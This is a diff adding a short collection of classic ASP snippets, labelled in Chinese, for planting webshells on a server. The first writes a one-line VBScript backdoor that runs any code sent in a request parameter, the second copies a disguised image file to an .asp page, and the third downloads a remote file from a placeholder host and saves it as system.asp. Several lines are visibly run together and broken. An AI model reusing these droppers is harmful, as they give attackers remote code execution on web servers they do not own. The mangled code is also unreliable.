@@ -1,0 +1,62 @@
+
+1.FSO生成一句话代码
+
+<%
+Dim Content,Fso,Fout
+Set Fso=Server.CreateObject("Scripting.FileSystemObject")
+Set Fout=Fso.CreateTextFile(Server.Mappath("../123.asp")) 
+Fout.WriteLine"<script language=VBScript runat=server>"
+if request(chr(35))<>"""" 
+then
+Fout.WriteLine"response.clear" 
+Fout.WriteLine"ExecuteGlobal request(chr(35))" 
+Fout.WriteLine"end if" 
+Fout.WriteLine"</script>" 
+Fout.Write Content 
+Fout.CloseSet 
+Fout=NothingSet 
+Fso=Nothing
+%>
+
+
+2.FSO复制文件代码
+
+<% 
+TempSource=Server.MapPath("/921196360.jpg")		//源文件
+TempEnd=Server.MapPath(folder&"../4040.asp")		//目标文件
+CopyFiles(TempSource,TempEnd)   
+Function CopyFiles(TempSource,TempEnd)
+Dim FSO 
+Set FSO =Server.CreateObject("Scripting.FileSystemObject")
+IF FSO.FileExists(TempEnd)
+then
+Response.Write"目标备份文件 <b>"& TempEnd &"</b> 
+已存在，请先删除!"
+Set FSO=Nothing 
+Exit 
+FunctionEndIF
+IF FSO.FileExists(TempSource)
+Then
+ElseResponse.Write"要复制的源数据文件 <b>"&TempSource&"</b> 不存在!"
+Set FSO=Nothing Exit 
+FunctionEnd
+If FSO.CopyFile 
+TempSource,TempEnd Response.Write"已经成功复制文件 <b>"&TempSource&"</b> 到 <b>"&TempEnd&"</b>"
+Set FSO =NothingEndFunction
+%>
+
+
+3、XMLHTTP 无FSO用到的下载文件代码
+
+<%
+Set xPost =CreateObject("Microsoft.XMLHTTP") 
+xPost.Open"GET","http://www.xxxxx.com/921994421.jpg",False 
+xPost.Send()
+Set sGet =CreateObject("ADODB.Stream") sGet.Mode=3 
+sGet.Type=1 
+sGet.Open() 
+sGet.Write(xPost.responseBody) 
+sGet.SaveToFileServer.MapPath("../system.asp"),2
+set sGet =nothing
+set sPOST =nothingresponse.Write("下载成功！")
+%>
